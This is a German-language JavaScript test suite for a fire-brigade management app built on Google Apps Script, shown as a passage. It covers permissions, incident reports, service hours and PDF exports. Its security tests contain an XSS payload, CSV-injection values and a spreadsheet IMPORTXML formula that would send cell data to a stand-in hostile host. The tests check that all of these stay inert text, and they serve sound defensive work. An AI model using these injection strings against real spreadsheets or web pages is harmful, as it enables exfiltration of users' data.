  pruefe(verboten(carla, 'personal.nachweisPdf', { mitglied_id: sb.ich.id }), 'Mitglied: kein Dienstnachweis');
  pruefe(a.rufe(ben, 'einsaetze.speichern', neu).ok, 'Gerätewart erfasst Berichte');
  pruefe(a.rufe(dora, 'einsaetze.speichern', neu).ok, 'Kommandant erfasst Berichte');
  pruefe(a.rufe(dora, 'einsaetze.tagebuch', { id: brand.id }).ok, 'Kommandant liest die Abschrift');
  a.ok(a.admin, 'hallengeraet.anmelden', { name: 'Tablet', geteilt: true, abmelden_nach_min: 3, geheimnis: 'G'.repeat(40) });
  a.setzeNutzer(a.hallenkonto);
  const token = JSON.parse(a.ctx.aufruf(null, 'halle.anmelden', { geraet: 'G'.repeat(40), code: 'ben' })).ergebnis.token;
  pruefe(!('einsaetze' in a.rufe(token, 'daten.laden').ergebnis), 'Hallengerät: keine Einsätze, auch nicht für den Gerätewart');
  pruefe(verboten(token, 'einsaetze.speichern', neu), 'am Hallengerät keine Berichte');
  a.ok(a.admin, 'einstellungen.speichern', { werte: { modul_personal: 'nein' } });
  pruefe(!('einsaetze' in a.stand(ben)), 'Modul aus: keine Einsätze');
  const r = a.rufe(ben, 'einsaetze.speichern', neu);
  pruefe(!r.ok && /ausgeschaltet/.test(r.fehler), 'Modul aus: kein Bericht', r);
});

teil('Einsätze: Zeitraum im Stand, Archiv, Stunden, Nachweise aus Einsätzen', () => {
  const a = bereit(true);
  const s = a.stand();
  const id = (name) => s.mitglieder.find((m) => m.name === name).id;
  const jahr = (iso) => a.lauf(`tagVon_(${JSON.stringify(iso)})`).slice(0, 4);
  gleich(s.einsatzZeitraum, (Number(s.heute.slice(0, 4)) - 1) + '-01-01', 'Zeitraum: ab 1. Januar des Vorjahres');
  gleich(s.einsaetze.map((e) => e.art).sort(), ['einsatz', 'einsatz', 'uebung', 'wache'], 'vier Berichte im Stand');
  pruefe(s.einsaetze.every((e) => e.beginn >= s.einsatzZeitraum), 'alle im Zeitraum');
  gleich(s.einsatzArchiv.length, 1, 'ein älteres Jahr');
  const alt = a.ok(a.admin, 'einsaetze.jahr', { jahr: s.einsatzArchiv[0] }).ergebnis;
  gleich(alt.einsaetze.map((e) => e.bezeichnung), ['Verkehrsunfall B 27'], 'älteres Jahr auf Nachfrage');
  gleich(alt.kraefte.length, 4, '… mit seinen Kräften');
  gleich(s.einsatzkraefte.filter((k) => !s.einsaetze.some((e) => e.id === k.einsatz_id)).length, 0, 'keine Kräfte ohne Bericht im Stand');
  pruefe(!('einsatz_eintraege' in s) && !s.einsaetze.some((e) => 'tagebuch' in e), 'die Abschrift nicht im Stand');

  // Jana: Brand in zwei Zeiträumen (43 + 65 min), Übung 150, Wache 360.
  const stunden = a.lauf(`einsatzStunden_(${JSON.stringify(s.einsaetze)}, ${JSON.stringify(s.einsatzkraefte)}, null)`);
  const jana = stunden.find((x) => x.mitglied_id === id('Jana Schaum'));
  gleich([jana.dienste, jana.minuten, jana.arten.einsatz.minuten, jana.arten.uebung.anzahl, jana.arten.wache.minuten, jana.atemschutz],
    [3, 43 + 65 + 150 + 360, 108, 1, 360, 1], 'Jana: drei Dienste, die Stunden je Art, einmal unter Atemschutz');
  const brand = s.einsaetze.find((e) => e.bezeichnung === 'Wohnungsbrand Lindenstraße 12');
  const summe = a.lauf(`einsatzSumme_(${JSON.stringify(s.einsatzkraefte.filter((k) => k.einsatz_id === brand.id))})`);
  gleich([summe.personen, summe.mitglieder, summe.atemschutz, summe.mittel], [7, 6, 3, 2], 'Brand: sieben Personen (ein Gast), drei unter Atemschutz, zwei Fahrzeuge');

  // Nachweise aus Einsätzen: Max und Sven vom Brand, Lena und Jana von der Übung.
  const art = s.qualiarten.find((q) => q.aus_einsatz);
  const aus = s.personal.ausEinsatz;
  gleich(aus.map((n) => s.mitglieder.find((m) => m.id === n.mitglied_id).name).sort(), ['Jana Schaum', 'Lena Wasser', 'Max Brenner', 'Sven Funke'], 'vier Nachweise aus Einsätzen');
  const max = aus.find((n) => n.mitglied_id === id('Max Brenner'));
  gleich([max.art_id, max.einsatz_id, max.erworben_am, max.gueltig_bis], [art.id, brand.id, a.lauf(`tagVon_(${JSON.stringify(brand.beginn)})`), a.lauf(`datumPlus_('${max.erworben_am}', 12, 'monate')`)],
    'Max: aus dem Brand, zwölf Monate');
  pruefe(s.personal.aktuell[max.id], 'zählt als aktueller Nachweis');
  pruefe(!s.nachweise.some((n) => n.art_id === art.id), 'steht nicht im Blatt „Nachweise“');
  gleich([s.personal.tauglich, s.personal.traeger, s.personal.abgelaufen, s.personal.bald], [3, 5, 1, 2], 'die Atemschutz-Zahlen der Demo bleiben');

  // Ein Einsatz unter Atemschutz vor drei Jahren: nicht im Stand – sein Datum aber schon.
  const paul = id('Paul Pumpe');
  const vor = (tage, h) => new Date(new Date(Date.now() - tage * 86400000).setHours(h, 0, 0, 0)).toISOString();
  a.ok(a.admin, 'einsaetze.speichern', { art: 'einsatz', bezeichnung: 'Scheunenbrand', beginn: vor(1100, 10), ende: vor(1100, 12),
    kraefte: [{ art: 'person', mitglied_id: paul, von: vor(1100, 10), bis: vor(1100, 12), atemschutz: true }] });
  const s2 = a.stand();
  pruefe(!s2.einsaetze.some((e) => e.bezeichnung === 'Scheunenbrand'), 'der alte nicht im Stand');
  pruefe(s2.einsatzArchiv.indexOf(jahr(vor(1100, 10))) >= 0, 'sein Jahr in der Auswahl', s2.einsatzArchiv);
  gleich(s2.atemschutzVorher[paul] && s2.atemschutzVorher[paul].datum, a.lauf(`tagVon_(${JSON.stringify(vor(1100, 10))})`), 'sein Datum unter atemschutzVorher');
  const pn = s2.personal.ausEinsatz.find((n) => n.mitglied_id === paul);
  pruefe(pn && pn.gueltig_bis < s2.heute && s2.personal.faellig.some((f) => f.id === pn.id && f.abgelaufen), 'Pauls Nachweis daraus: abgelaufen, in der Aktionsliste', pn);
  // Der Browser rechnet aus dem Stand dasselbe wie der Server mit allen Jahren.
  const pdf = Buffer.from(a.ok(a.admin, 'personal.nachweisPdf', { mitglied_id: paul, jahr: jahr(vor(1100, 10)) }).ergebnis.base64, 'base64').toString('utf8');
  pruefe(pdf.indexOf('Scheunenbrand') > 0 && /aus den Einsatzberichten/.test(pdf), 'Dienstnachweis des alten Jahres nennt den Einsatz und die Herkunft');
});

teil('Einsätze: übernehmen, ersetzen, löschen – mit Abschrift', () => {
  const a = bereit(true);
  const s = a.stand();
  const id = (name) => s.mitglieder.find((m) => m.name === name).id;
  const brand = s.einsaetze.find((e) => e.bezeichnung === 'Wohnungsbrand Lindenstraße 12');
  const t = a.ok(a.admin, 'einsaetze.tagebuch', { id: brand.id }).ergebnis;
  gleich([t.filter((x) => x.liste === 'tagebuch').length, t.filter((x) => x.liste === 'kraefte').length], [14, 20], 'Abschrift: 14 Einträge, 20 Kräfte-Einträge');
  pruefe(t.some((x) => x.geloescht && /Hydrant/.test(x.text)), 'gestrichen bleibt drin');
  pruefe(t.some((x) => x.vorher.length === 1 && /Treppenraum/.test(x.text)), 'frühere Fassung als Liste');
  pruefe(t.some((x) => x.zeit_vorher.length === 1 && /Überdrucklüfter/.test(x.text)), 'frühere Uhrzeit als Liste');
  const zeilen = () => a.blatt('Einsatztagebuch').getLastRow() - 1;
  const vorher = zeilen();
  const protokoll = a.protokoll().length;

  const vor = (tage, h) => new Date(new Date(Date.now() - tage * 86400000).setHours(h, 0, 0, 0)).toISOString();
  const bericht = (extra) => Object.assign({ art: 'einsatz', bezeichnung: 'Kellerbrand', beginn: vor(2, 20), ende: vor(2, 22), quelle: 'einsatztagebuch', quelle_kennung: 'tagebuch:K',
    kraefte: [{ art: 'person', mitglied_id: id('Paul Pumpe'), name: 'egal', von: vor(2, 20), bis: vor(2, 21), atemschutz: true }],
    tagebuch: [{ liste: 'tagebuch', zeit: vor(2, 20), text: 'Alarm' }, { liste: 'tagebuch', zeit: vor(2, 21), text: 'Ende' }] }, extra || {});
  const erst = a.ok(a.admin, 'einsaetze.speichern', bericht()).ergebnis.id;
  gleich(zeilen(), vorher + 2, 'Abschrift angehängt');
  gleich(a.protokoll().length - protokoll, 2, 'im Protokoll: der Bericht und die eine Kraft – nicht jede Zeile der Abschrift');
  const k = a.stand().einsatzkraefte.find((x) => x.einsatz_id === erst);
  gleich([k.name, k.mitglied_id], ['Paul Pumpe', id('Paul Pumpe')], 'Mitglied trägt seinen Namen, nicht den aus dem Tagebuch');
  const doppelt = a.rufe(a.admin, 'einsaetze.speichern', bericht());
  pruefe(!doppelt.ok && doppelt.code === 'doppelt' && /schon übernommen/.test(doppelt.fehler), 'zweites Übernehmen abgelehnt', doppelt);
  const zweit = a.ok(a.admin, 'einsaetze.speichern', bericht({ ersetzt: erst, bezeichnung: 'Kellerbrand (neu)', tagebuch: [{ liste: 'tagebuch', zeit: vor(2, 20), text: 'Alarm' }] })).stand;
  gleich(zweit.einsaetze.filter((e) => e.quelle_kennung === 'tagebuch:K').map((e) => e.bezeichnung), ['Kellerbrand (neu)'], 'ersetzt: nur noch der neue');
  gleich(zeilen(), vorher + 1, 'die alte Abschrift ist mitgegangen');
  const neuId = zweit.einsaetze.find((e) => e.quelle_kennung === 'tagebuch:K').id;
  a.ok(a.admin, 'einsaetze.loeschen', { id: neuId });
  gleich(zeilen(), vorher, 'gelöscht: Abschrift weg');
  gleich(a.stand().einsatzkraefte.filter((x) => x.einsatz_id === neuId).length, 0, 'Kräfte weg');
  pruefe(!a.rufe(a.admin, 'einsaetze.speichern', bericht({ tagebuch: [{ liste: 'tagebuch', zeit: 'gestern', text: 'x' }] })).ok, 'Abschrift ohne gültige Zeit: nichts geschrieben');
  gleich(zeilen(), vorher, '… auch nicht halb');

  // Wer austritt, bleibt im Bericht – mit Namen, ohne Verweis.
  const jana = id('Jana Schaum');
  const nachher = a.ok(a.admin, 'mitglieder.loeschen', { id: jana }).stand;
  const reste = nachher.einsatzkraefte.filter((x) => x.name === 'Jana Schaum');
  pruefe(reste.length === 4 && reste.every((x) => x.mitglied_id === null), 'Jana bleibt in vier Zeilen, als Name', reste);
});

teil('Einsätze: Bericht, Dienstnachweis und Stunden als PDF', () => {
  const a = bereit(true);
  const s = a.stand();
  const html = (name, args) => Buffer.from(a.ok(a.admin, name, args).ergebnis.base64, 'base64').toString('utf8');
  const brand = s.einsaetze.find((e) => e.bezeichnung === 'Wohnungsbrand Lindenstraße 12');
  const b = html('einsaetze.pdf', { id: brand.id });
  pruefe(/Einsatzbericht/.test(b) && b.indexOf('Wohnungsbrand Lindenstraße 12') > 0 && b.indexOf(brand.nummer) > 0, 'Bericht: Titel, Bezeichnung, Nummer');
  pruefe(b.indexOf('Heinz Nachbar (FF Nachbarort)') > 0 && b.indexOf('DLK 23') > 0, 'Gastkraft und Fahrzeug');
  pruefe(/<s>Wassertrupp zur Wasserversorgung Hydrant Lindenstraße<\/s>/.test(b) && /vorher: Angriffstrupp unter PA zur Menschenrettung vor/.test(b), 'Abschrift: gestrichen und frühere Fassung');
  pruefe(/Menschenrettung durch den Angriffstrupp/.test(b) && /Personenstunden/.test(b), 'Bericht und Personenstunden');
  a.ok(a.admin, 'einsatzkraefte.speichern', { einsatz_id: brand.id, art: 'person', name: '<img src=x onerror=alert(1)>', von: brand.beginn, bis: brand.ende });
  const boese = html('einsaetze.pdf', { id: brand.id });
  pruefe(boese.indexOf('<img src=x') < 0 && boese.indexOf('&lt;img src=x onerror=alert(1)&gt;') > 0, 'Namen werden im PDF maskiert, nicht als HTML gelesen');
  const max = s.mitglieder.find((m) => m.name === 'Max Brenner').id;
  const jahr = s.heute.slice(0, 4);
  const mit = html('personal.nachweisPdf', { mitglied_id: max, jahr: jahr });
  const ohne = html('personal.nachweisPdf', { mitglied_id: max, jahr: jahr, qualifikationen: false });
  pruefe(/Dienstnachweis/.test(mit) && mit.indexOf('Atemschutzübung Werkhalle') > 0, 'Dienstnachweis: die Dienste');
  pruefe(/G26\.3/.test(mit) && /atemschutztauglich/.test(mit), 'mit Qualifikationen: G26.3 und Atemschutz');
  pruefe(!/G26\.3/.test(ohne) && !/tauglich/.test(ohne) && ohne.indexOf('Atemschutzübung Werkhalle') > 0, 'ohne: keine Gesundheitsdaten, aber die Dienste');
  const st = html('einsaetze.stundenPdf', { jahr: jahr });
  pruefe(/Dienststunden/.test(st) && st.indexOf('Jana Schaum') > 0 && st.indexOf('Anna Admin') > 0, 'Stunden: alle aktiven Mitglieder');
  pruefe(!a.rufe(a.admin, 'personal.nachweisPdf', { mitglied_id: max, jahr: '20x6' }).ok, 'nur gültige Jahre');
});

teil('Einsatztagebuch lesen (im Browser)', () => {
  const a = bereit(true);
  const browser = browserKontext(a.lauf('gemeinsamerCode_()'));
  const beispiel = tagebuchBeispiel();
  browser.ctx.__text = JSON.stringify(beispiel);
  const t = JSON.parse(browser.lauf('JSON.stringify(tagebuchLesen(__text))'));
  const um = (h, m, sek = 0) => {
    const tag = new Date(Date.now() - 2 * 86400000);
    return new Date(tag.getFullYear(), tag.getMonth(), tag.getDate(), h, m, sek).toISOString();
  };
  gleich(t.kennung, 'tagebuch:' + beispiel.erstelltAm, 'erkannt am Beginn des Tagebuchs');
  gleich([t.beginn, t.ende], [um(20, 14), um(21, 34, 10)], 'Beginn aus Datum und Alarmzeit, Ende aus dem letzten Eintrag');
  gleich([t.meta.bezeichnung, t.meta.nummer, t.meta.einsatzleiter], ['Kellerbrand Mühlweg 3', beispiel.meta.einsatznummer, 'Tom Leiter'], 'Kopfdaten');
  gleich([t.eintraege.length, t.gestrichen], [7 + 13, 1], 'alle Einträge in die Abschrift, einer gestrichen');
  const k = (name) => t.kraefte.find((x) => x.name === name);
  gleich(t.kraefte.map((x) => x.name).sort(), ['Brenner, Max', 'Gerda Gast (DRK)', 'LF 10', 'Lena Wasser', 'Paul Pumpe', 'Tom Leiter'], 'Gestrichenes zählt nicht (Sven)');
  gleich(k('Paul Pumpe').intervalle, [{ von: um(20, 22), bis: um(20, 40) }, { von: um(20, 55), bis: null }], 'Paul: zweimal, das zweite Mal ohne Abrücken');
  gleich(k('Lena Wasser').intervalle, [{ von: um(20, 19, 42), bis: null }], 'Lena: nie abgerückt – bis Einsatzende');
  gleich(k('Brenner, Max').funktion, 'Angriffstrupp unter PA', 'Kommentar wird Funktion');
  // Zuordnen: gegen die Mitglieder und Fahrzeuge des Stands.
  browser.ctx.__stand = JSON.stringify(a.stand());
  browser.lauf('Z.daten = JSON.parse(__stand)');
  const zu = (name) => browser.lauf(`tagebuchZuordnen(${JSON.stringify(name)})`);
  const s = a.stand();
  gleich([zu('Brenner, Max'), zu('  lena wasser '), zu('LF 10'), zu('Gerda Gast (DRK)'), zu('Florian 44/1')],
    ['m:' + s.mitglieder.find((m) => m.name === 'Max Brenner').id, 'm:' + s.mitglieder.find((m) => m.name === 'Lena Wasser').id, 'mittel', 'gast', 'mittel'], 'Mitglied (auch „Nachname, Vorname“), Fahrzeug, Gast');
  for (const [kaputt, text] of [['{', /keine JSON-Datei/], ['{"meta":{}}', /kein Einsatztagebuch/]]) {
    browser.ctx.__text = kaputt;
    let fehler = '';
    try {
      browser.lauf('tagebuchLesen(__text)');
    } catch (e) {
      fehler = e.message;
    }
    pruefe(text.test(fehler), 'abgelehnt mit Begründung: ' + kaputt, fehler);
  }
});

teil('Ein neues Blatt legt sich selbst an', () => {
  const a = bereit(false);
  const mappe = a.mappe;
  mappe.deleteSheet(mappe.getSheetByName('Nachweise'));
  a.ctx.onEdit();
  const r = a.rufe(a.admin, 'daten.laden');
  pruefe(r.ok && Array.isArray(r.ergebnis.nachweise), 'Stand trotz fehlendem Blatt', r.fehler);
  pruefe(!!mappe.getSheetByName('Nachweise'), 'Blatt „Nachweise“ wieder da');
});

// ═══════════════════════════════ Sicherheit ═══════════════════════════════

teil('Formeln bleiben Text – in jedem Blatt, auf jedem Weg', () => {
  const a = bereit(true);
  // Wer „=IMPORTXML(…)“ einträgt, darf nicht erleben, dass die Tabelle es ausführt, wenn der
  // Eigentümer sie öffnet. Jede Zelle ist Nur-Text, bevor etwas hineingeschrieben wird.
  const formel = '=IMPORTXML("https://boese.example/?d="&A2;"//a")';
  a.ok(a.admin, 'mitglieder.speichern', { name: formel, email: 'f@ff.example', rolle: 'mitglied' });
  const s = a.stand();
  const pa01 = a.geraet(s, 'PA01');
  a.ok(a.admin, 'geraete.speichern', { id: pa01.id, bemerkung: '=1+1' });
  const e = a.ok(a.admin, 'einsaetze.speichern', { art: 'uebung', bezeichnung: '+Übung', beginn: new Date().toISOString(),
    tagebuch: [{ liste: 'tagebuch', zeit: new Date().toISOString(), text: formel }] }).ergebnis.id;
  a.ctx.onEdit();
  const s2 = a.stand();
  pruefe(s2.mitglieder.some((m) => m.name === formel), 'Mitgliedsname (geändertes Blatt) bleibt Text');
  gleich(a.geraet(s2, 'PA01').bemerkung, '=1+1', 'Bemerkung bleibt Text');
  gleich(a.ok(a.admin, 'einsaetze.tagebuch', { id: e }).ergebnis[0].text, formel, 'Abschrift (angehängt, nie gelesen) bleibt Text');
  pruefe(!a.mappe.getSheets().some((b) => b.daten.some((z) => z.some((w) => String(w).indexOf('#FORMEL:') === 0))), 'in keinem Blatt eine Formel – auch nicht im Protokoll');
  // Und nach draußen: CSV für Excel.
  const browser = browserKontext(a.lauf('gemeinsamerCode_()'));
  const csv = (w) => browser.lauf(`csvZelle(${JSON.stringify(w)})`);
  gleich(['=1+1', '+49 170', '@SUMME(A1)', '- Kupplung', '-12,5', 'PA01', 'a;b'].map(csv),
    ["'=1+1", "'+49 170", "'@SUMME(A1)", "'- Kupplung", '-12,5', 'PA01', '"a;b"'], 'CSV: was Excel als Formel läse, wird Text – Zahlen bleiben Zahlen');
});

teil('Keine fremden Skripte, keine Pakete, nur die nötigen Berechtigungen', () => {
  const html = Object.entries(Object.fromEntries(fs.readdirSync(SRC).filter((f) => f.endsWith('.html')).map((f) => [f, fs.readFileSync(path.join(SRC, f), 'utf8')])));
  for (const [f, t] of html) {
    pruefe(!/<script[^>]+src=/i.test(t) && !/<link[^>]+href=["']?https?:/i.test(t), f + ': nichts von außen geladen');
    pruefe(!/\bimport\s*\(|\beval\s*\(|new Function\s*\(|document\.write|insertAdjacentHTML|outerHTML/.test(t), f + ': kein eval, kein nachgeladener Code, kein HTML aus Text');
  }
  const inner = html.flatMap(([f, t]) => [...t.matchAll(/innerHTML/g)].map(() => f));
  gleich(inner, ['js_bausteine.html'], 'innerHTML genau einmal – für die festen Symbole');
  for (const f of fs.readdirSync(SRC).filter((x) => x.endsWith('.js'))) {
    const t = fs.readFileSync(path.join(SRC, f), 'utf8');
    pruefe(!/UrlFetchApp|DriveApp|GmailApp|MailApp|\beval\s*\(|new Function\s*\(/.test(t), f + ': kein Netz, kein Drive, keine Mail, kein eval');
  }
  const manifest = JSON.parse(fs.readFileSync(path.join(SRC, 'appsscript.json'), 'utf8'));
  gleich(manifest.oauthScopes.slice().sort(), ['https://www.googleapis.com/auth/script.container.ui', 'https://www.googleapis.com/auth/script.scriptapp',
    'https://www.googleapis.com/auth/spreadsheets.currentonly', 'https://www.googleapis.com/auth/userinfo.email'], 'genau vier Berechtigungen – nur diese eine Tabelle');
  gleich(manifest.dependencies, {}, 'keine Apps-Script-Bibliotheken');
  gleich([manifest.webapp.executeAs, manifest.webapp.access], ['USER_DEPLOYING', 'DOMAIN'], 'Web-App: als Eigentümer, nur für die Domain');
  const paket = JSON.parse(fs.readFileSync(path.join(WURZEL, 'package.json'), 'utf8'));
  pruefe(!paket.dependencies && !paket.devDependencies, 'package.json ohne Abhängigkeiten');
});

// ═══════════════════════════════ Oberfläche: Syntax ═══════════════════════════════

teil('Jeder Skriptblock der Oberfläche ist gültiges JavaScript', () => {
  for (const f of fs.readdirSync(SRC).filter((x) => x.endsWith('.html'))) {
    const text = fs.readFileSync(path.join(SRC, f), 'utf8');
    for (const [, code] of text.matchAll(/<script>([\s\S]*?)<\/script>/g)) {
      try {
        new vm.Script(code.replace(/<\?!=[\s\S]*?\?>/g, '{}'), { filename: f });
        pruefe(true, f);
      } catch (e) {
        pruefe(false, f + ': ' + e.message);
      }
    }
  }
  // Server- und Oberflächenteile teilen sich im Browser keinen Namen auf oberster Ebene –
  // auch nicht mit dem gemeinsamen Code, den `doGet` davorsetzt.
  const oben = (code) => new Set([...code.matchAll(/^(?:const|let|function|class)\s+([A-Za-z0-9_$]+)/gm)].map((m) => m[1]));
  const client = new Set(oben(anlage().lauf('gemeinsamerCode_()')));
  fs.readdirSync(SRC).filter((x) => x.endsWith('.html')).forEach((f) => {
    const t = fs.readFileSync(path.join(SRC, f), 'utf8');
    for (const [, c] of t.matchAll(/<script>([\s\S]*?)<\/script>/g)) {
      oben(c).forEach((n) => {
        pruefe(!client.has(n), 'Name doppelt in der Oberfläche: ' + n);
        client.add(n);
      });
    }
  });
});

// ═══════════════════════════════ Ergebnis ═══════════════════════════════

if (fehlschlaege.length) {
  console.log('\n✗ ' + fehlschlaege.length + ' von ' + gesamt + ' Prüfungen fehlgeschlagen:\n');
  fehlschlaege.forEach((f) => console.log('  • ' + f));
  process.exitCode = 1;
} else {
  console.log('✓ ' + gesamt + ' Prüfungen bestanden.');
}
